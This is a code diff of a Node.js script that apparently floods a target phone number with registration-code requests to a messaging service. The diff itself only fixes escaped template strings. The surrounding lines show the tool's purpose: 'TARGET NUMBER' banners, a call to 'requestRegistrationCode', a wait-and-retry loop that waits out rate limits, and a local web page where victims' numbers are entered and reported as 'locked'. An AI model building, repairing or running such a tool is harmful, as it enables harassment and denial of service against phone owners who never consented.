@@ -170,9 +170,9 @@ const start = async () => {
                 console.log(masterBanner);
                 console.log(spiderArt);
                 console.log(color('───────────────────────────────────────', ['#FF0000', '#000000']));
-                console.log(color(\`  [+] SYSTEM STATUS : ACTIVE 🚀        \`, ['#00FF00', '#FFFFFF']));
-                console.log(color(\`  [+] TARGET NUMBER : +\${ddi}\${number} \`, ['#FF0000', '#FFFFFF']));
-                console.log(color(\`  [+] DEVELOPED BY  : NONAMEHACKER     \`, ['#FFFF00', '#FFA500']));
+                console.log(color(`  [+] SYSTEM STATUS : ACTIVE 🚀        `, ['#00FF00', '#FFFFFF']));
+                console.log(color(`  [+] TARGET NUMBER : +${ddi}${number} `, ['#FF0000', '#FFFFFF']));
+                console.log(color(`  [+] DEVELOPED BY  : NONAMEHACKER     `, ['#FFFF00', '#FFA500']));
                 console.log(color('───────────────────────────────────────', ['#FF0000', '#000000']));
 
                 const res = await spam.requestRegistrationCode({
@@ -183,7 +183,7 @@ const start = async () => {
                 });
 
                 if (res.reason === 'temporarily_unavailable') {
-                    console.log(color(\`[!] LIMIT REACHED! WAITING: \${res.retry_after}s\`, ['#FF4500', '#FF0000']));
+                    console.log(color(`[!] LIMIT REACHED! WAITING: ${res.retry_after}s`, ['#FF4500', '#FF0000']));
                     await new Promise(r => setTimeout(r, res.retry_after * 1000));
                 }
             } catch (e) {
@@ -214,7 +214,7 @@ const start = async () => {
                 
                 // Respond back to the frontend immediately
                 res.writeHead(200, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ message: \`Target +\${data.ddi}\${data.number} locked. Check terminal.\` }));
+                res.end(JSON.stringify({ message: `Target +${data.ddi}${data.number} locked. Check terminal.` }));
             });
         } else {
             res.writeHead(404);
@@ -223,8 +223,9 @@ const start = async () => {
     });
 
     server.listen(3000, () => {
-        console.log(color('\\n ► SERVER RUNNING! Open http://localhost:3000 in your browser to enter numbers.', ['#00FF00', '#FFFFFF']));
+        console.log(color('\n ► SERVER RUNNING! Open http://localhost:3000 in your browser to enter numbers.', ['#00FF00', '#FFFFFF']));
     });
 };
 
 start();
+
